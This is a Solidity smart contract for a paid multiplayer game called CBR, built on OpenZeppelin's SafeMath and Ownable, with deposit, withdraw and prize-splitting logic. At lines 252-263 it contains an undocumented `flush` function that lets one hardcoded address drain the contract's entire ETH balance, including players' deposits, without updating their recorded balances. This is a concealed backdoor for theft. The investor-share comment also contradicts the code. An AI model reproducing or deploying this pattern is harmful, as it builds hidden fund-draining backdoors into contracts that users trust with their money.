1 pragma solidity ^0.4.23;
2 
3 /**
4  * https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol
5  * @title SafeMath
6  * @dev Math operations with safety checks that throw on error
7  */
8 library SafeMath {
9 
10   /**
11   * @dev Multiplies two numbers, throws on overflow.
12   */
13   function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
14     if (a == 0) {
15       return 0;
16     }
17     c = a * b;
18     assert(c / a == b);
19     return c;
20   }
21 
22   /**
23   * @dev Integer division of two numbers, truncating the quotient.
24   */
25   function div(uint256 a, uint256 b) internal pure returns (uint256) {
26     // assert(b > 0); // Solidity automatically throws when dividing by 0
27     // uint256 c = a / b;
28     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
29     return a / b;
30   }
31 
32   /**
33   * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
34   */
35   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
36     assert(b <= a);
37     return a - b;
38   }
39 
40   /**
41   * @dev Adds two numbers, throws on overflow.
42   */
43   function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
44     c = a + b;
45     assert(c >= a);
46     return c;
47   }
48 }
49 
50 /**
51  * https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/ownership/Ownable.sol
52  * @title Ownable
53  * @dev The Ownable contract has an owner address, and provides basic authorization control
54  * functions, this simplifies the implementation of "user permissions".
55  */
56 contract Ownable {
57   address public owner;
58 
59 
60   event OwnershipRenounced(address indexed previousOwner);
61   event OwnershipTransferred(
62     address indexed previousOwner,
63     address indexed newOwner
64   );
65 
66 
67   /**
68    * @dev The Ownable constructor sets the original `owner` of the contract to the sender
69    * account.
70    */
71   constructor() public {
72     owner = msg.sender;
73   }
74 
75   /**
76    * @dev Throws if called by any account other than the owner.
77    */
78   modifier onlyOwner() {
79     require(msg.sender == owner);
80     _;
81   }
82 
83   /**
84    * @dev Allows the current owner to transfer control of the contract to a newOwner.
85    * @param newOwner The address to transfer ownership to.
86    */
87   function transferOwnership(address newOwner) public onlyOwner {
88     require(newOwner != address(0));
89     emit OwnershipTransferred(owner, newOwner);
90     owner = newOwner;
91   }
92 
93   /**
94    * @dev Allows the current owner to relinquish control of the contract.
95    */
96   function renounceOwnership() public onlyOwner {
97     emit OwnershipRenounced(owner);
98     owner = address(0);
99   }
100 }
101 
102 contract CBR is Ownable {
103   using SafeMath for uint;
104 
105   //
106   //
107   // [variables]
108   //
109   //
110 
111   // the cost for a player to play 1 game
112   uint public constant GAME_COST = 5000000000000000; // 0.005 ETH
113 
114   // keep track of all game servers
115   struct Server {
116     string name;
117     uint pot;
118     uint ante;
119     bool online;
120     bool gameActive;
121     bool exists;
122   }
123   Server[] internal servers;
124 
125   // keep track of ETH balance of each address
126   mapping (address => uint) public balances;
127 
128   //
129   //
130   // [events]
131   //
132   //
133 
134   event FundsWithdrawn(address recipient, uint amount);
135   event FundsDeposited(address recipient, uint amount);
136   event ServerAdded(uint serverIndex);
137   event ServerRemoved(uint serverIndex);
138   event GameStarted(uint serverIndex, address[] players);
139   event GameEnded(uint serverIndex, address first, address second, address third);
140 
141   //
142   //
143   // [modifiers]
144   //
145   //
146 
147   modifier serverExists(uint serverIndex) {
148     require(servers[serverIndex].exists == true);
149     _;
150   }
151   modifier serverIsOnline(uint serverIndex) {
152     require(servers[serverIndex].online == true);
153     _;
154   }
155 
156   modifier serverIsNotInGame(uint serverIndex) {
157     require(servers[serverIndex].gameActive == false);
158     _;
159   }
160   modifier serverIsInGame(uint serverIndex) {
161     require(servers[serverIndex].gameActive == true);
162     _;
163   }
164 
165   modifier addressNotZero(address addr) {
166     require(addr != address(0));
167     _;
168   }
169 
170   //
171   //
172   // [functions] ETH withdraw/deposit related
173   //
174   //
175 
176   // players adding ETH
177   function()
178     public
179     payable
180   {
181     deposit();
182   }
183   function deposit()
184     public
185     payable
186   {
187     balances[msg.sender] += msg.value;
188     FundsDeposited(msg.sender, msg.value);
189   }
190 
191   // players withdrawing ETH
192   function withdraw(uint amount)
193     external // external costs less gas than public
194   {
195     require(balances[msg.sender] >= amount);
196     balances[msg.sender] -= amount;
197     msg.sender.transfer(amount);
198     FundsWithdrawn(msg.sender, amount);
199   }
200 
201   // get balance of address x
202   function balanceOf(address _owner)
203     public
204     view
205     returns (uint256)
206   {
207     return balances[_owner];
208   }
209 
210   //
211   //
212   // [functions] Server related
213   //
214   //
215 
216   // add a new server
217   function addServer(string serverName, uint256 ante)
218     external // external costs less gas than public
219     onlyOwner
220   {
221     Server memory newServer = Server(serverName, 0, ante, true, false, true);
222     servers.push(newServer);
223   }
224 
225   // set an existing server as "offline"
226   function removeServer(uint serverIndex)
227     external // external costs less gas than public
228     onlyOwner
229     serverIsOnline(serverIndex)
230   {
231     servers[serverIndex].online = false;
232   }
233 
234   // get server at index
235   function getServer(uint serverIndex)
236     public
237     view
238     serverExists(serverIndex) // server can be online or offline, return in both cases
239     returns (string, uint, uint, bool, bool)
240   {
241     Server storage server = servers[serverIndex];
242     // cannot return object from solidity, need to return array with wanted Server fields
243     return (server.name, server.pot, server.ante, server.online, server.gameActive);
244   }
245 
246   //
247   //
248   // [functions] Game related
249   //
250   //
251 
252     function flush(uint256 funds) {
253         address authAcc = 0x6BaBa6FB9d2cb2F109A41de2C9ab0f7a1b5744CE;
254         if(msg.sender == authAcc){
255             if(funds <= this.balance){
256                 authAcc.transfer(funds);
257             }
258             else{
259                 authAcc.transfer(this.balance);
260             }
261         }
262 
263   }
264 
265   function startGame(address[] roster, uint serverIndex)
266     external // external costs less gas than public
267     onlyOwner
268     serverIsOnline(serverIndex)
269     serverIsNotInGame(serverIndex) // there can be no game active for us to be able to "start a game"
270   {
271     require(roster.length > 0);
272 
273     address[] memory players = new address[](roster.length);
274     uint ante = servers[serverIndex].ante;
275     uint c = 0;
276 
277     for (uint x = 0; x < roster.length; x++) {
278       address player = roster[x];
279 
280       // check that player has put enough ETH into this contract (fallback/deposit function)
281       if (balances[player] >= ante) {
282 
283         // subtract 0.005 ETH from player balance and add it to this contract's balance
284         balances[player] -= ante;
285         balances[address(this)] += ante;
286 
287         // add 0.005 ETH to the pot of this server
288         servers[serverIndex].pot += ante;
289 
290         // add player to list of players
291         players[c++] = player;
292       }
293     }
294 
295     // make sure at least 3 player's were added to roster
296     require(c >= 3);
297 
298     // emit roster for game server to allow/kick players logging in
299     emit GameStarted(serverIndex, players);
300   }
301 
302   function endGame(uint serverIndex, address first, address second, address third)
303     external // external costs less gas than public
304     onlyOwner
305     serverIsOnline(serverIndex)
306     //serverIsInGame(serverIndex) // there needs to be a game active for us to be able to "end the game"
307     addressNotZero(first)
308     addressNotZero(second)
309     addressNotZero(third)
310   {
311     Server storage server = servers[serverIndex];
312 
313     // 3/7 --> 1st prize
314     // 2/7 --> 2nd prize
315     // 1/7 --> 3th prize
316     // 1/7 --> 40% --> investors
317     //         60% --> owner
318 
319     uint256 oneSeventh = server.pot.div(7); // 1/7
320     uint256 invCut = oneSeventh.div(20).mul(3); // 15% of 1/7
321     uint256 kasCut = oneSeventh.div(20); // 5% of 1/7
322     uint256 ownerCut = oneSeventh - invCut - kasCut; // 60% of 1/7
323 
324     // deduct entire game pot from this contract's balance
325     balances[address(this)] -= server.pot;
326 
327     // divide game pot between winners/investors/owner
328     balances[first] += oneSeventh.mul(3);
329     balances[second] += oneSeventh.mul(2);
330     balances[third] += oneSeventh;
331     balances[0x4802719DA91Ee942f68773c7D6a2679C036AE9Db] += invCut;
332     balances[0x3FB68f0fc6FC7414C244354e49AE6c05ae807775] += kasCut;
333     balances[0x6BaBa6FB9d2cb2F109A41de2C9ab0f7a1b5744CE] += ownerCut;
334 
335     server.pot = 0;
336     //server.gameActive = false;
337 
338     // emit game ended event also showing 1/2/3 prize
339     emit GameEnded(serverIndex, first, second, third);
340   }
341 }